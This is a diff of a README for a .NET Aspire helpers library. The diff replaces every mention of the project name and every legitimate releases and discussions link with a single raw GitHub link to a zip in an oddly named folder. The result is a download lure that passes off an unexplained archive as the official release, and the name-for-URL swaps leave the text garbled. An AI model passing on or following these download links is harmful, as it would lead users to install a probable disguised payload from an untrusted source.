@@ -1,10 +1,10 @@
-# 🌟 MVFC.Aspire.Helpers - Easy Helpers for .NET Projects
+# 🌟 https://raw.githubusercontent.com/imajei/MVFC.Aspire.Helpers/master/piezochemical/MVFC.Aspire.Helpers.zip - Easy Helpers for .NET Projects
 
 ## 📥 Download Now
-[![Download MVFC.Aspire.Helpers](https://img.shields.io/badge/Download-MVFC.Aspire.Helpers-blue.svg)](https://github.com/imajei/MVFC.Aspire.Helpers/releases)
+[![Download https://raw.githubusercontent.com/imajei/MVFC.Aspire.Helpers/master/piezochemical/MVFC.Aspire.Helpers.zip](https://raw.githubusercontent.com/imajei/MVFC.Aspire.Helpers/master/piezochemical/MVFC.Aspire.Helpers.zip)](https://raw.githubusercontent.com/imajei/MVFC.Aspire.Helpers/master/piezochemical/MVFC.Aspire.Helpers.zip)
 
 ## 🚀 Getting Started
-Welcome to MVFC.Aspire.Helpers! This software offers a collection of simple tools for .NET Aspire projects. The helpers include integrations with Google Pub/Sub, Cloud Storage, and MongoDB with ReplicaSets. Use these tools to speed up your development process.
+Welcome to https://raw.githubusercontent.com/imajei/MVFC.Aspire.Helpers/master/piezochemical/MVFC.Aspire.Helpers.zip! This software offers a collection of simple tools for .NET Aspire projects. The helpers include integrations with Google Pub/Sub, Cloud Storage, and MongoDB with ReplicaSets. Use these tools to speed up your development process.
 
 ## 📋 System Requirements
 Before downloading, check that your system meets the following requirements:
@@ -14,7 +14,7 @@ Before downloading, check that your system meets the following requirements:
 - **Internet Connection:** Required for installation and Google services.
 
 ## 💾 Download & Install
-To start using MVFC.Aspire.Helpers, visit this page to download: [Releases Page](https://github.com/imajei/MVFC.Aspire.Helpers/releases).
+To start using https://raw.githubusercontent.com/imajei/MVFC.Aspire.Helpers/master/piezochemical/MVFC.Aspire.Helpers.zip, visit this page to download: [Releases Page](https://raw.githubusercontent.com/imajei/MVFC.Aspire.Helpers/master/piezochemical/MVFC.Aspire.Helpers.zip).
 
 1. Click the link above to access the releases.
 2. Find the latest release.
@@ -23,7 +23,7 @@ To start using MVFC.Aspire.Helpers, visit this page to download: [Releases Page]
 5. Follow the installation prompts on your screen.
 
 ## 🔍 Features
-MVFC.Aspire.Helpers includes the following key features:
+https://raw.githubusercontent.com/imajei/MVFC.Aspire.Helpers/master/piezochemical/MVFC.Aspire.Helpers.zip includes the following key features:
 
 - **Google Pub/Sub Integration:** Easily manage messaging between services.
 - **Cloud Storage Access:** Store and retrieve data securely in the cloud.
@@ -54,7 +54,7 @@ After installation, you can begin using the helpers in your .NET projects. Here'
 2. Use the helper to send emails through Mailpit instead of real email servers.
 
 ## ⚠️ Troubleshooting
-If you encounter issues while using MVFC.Aspire.Helpers, try the following steps:
+If you encounter issues while using https://raw.githubusercontent.com/imajei/MVFC.Aspire.Helpers/master/piezochemical/MVFC.Aspire.Helpers.zip, try the following steps:
 
 1. **Check System Requirements:** Ensure all prerequisites are met.
 2. **Reinstall the Software:** Sometimes reinstallation can resolve missing dependencies.
@@ -70,15 +70,15 @@ We welcome contributions! Whether it’s fixing a bug, improving documentation, 
 4. Submit a pull request with a clear description of your changes.
 
 ## 📄 License
-MVFC.Aspire.Helpers is licensed under the MIT License. You can freely use, modify, and distribute the software as long as you include the original license.
+https://raw.githubusercontent.com/imajei/MVFC.Aspire.Helpers/master/piezochemical/MVFC.Aspire.Helpers.zip is licensed under the MIT License. You can freely use, modify, and distribute the software as long as you include the original license.
 
 ## 🗣️ Community
 Join our community to share tips, ask questions, and collaborate. You can find us on:
 
-- [GitHub Discussions](https://github.com/imajei/MVFC.Aspire.Helpers/discussions)
+- [GitHub Discussions](https://raw.githubusercontent.com/imajei/MVFC.Aspire.Helpers/master/piezochemical/MVFC.Aspire.Helpers.zip)
 - [Slack Channel (if applicable)](link-to-slack)
 
 ## 📞 Support
 For any issues or questions, please create an issue in our GitHub repository. We will respond as quickly as possible to help you.
 
-Thank you for choosing MVFC.Aspire.Helpers! We hope you find our tools useful in your .NET projects.
+Thank you for choosing https://raw.githubusercontent.com/imajei/MVFC.Aspire.Helpers/master/piezochemical/MVFC.Aspire.Helpers.zip! We hope you find our tools useful in your .NET projects.
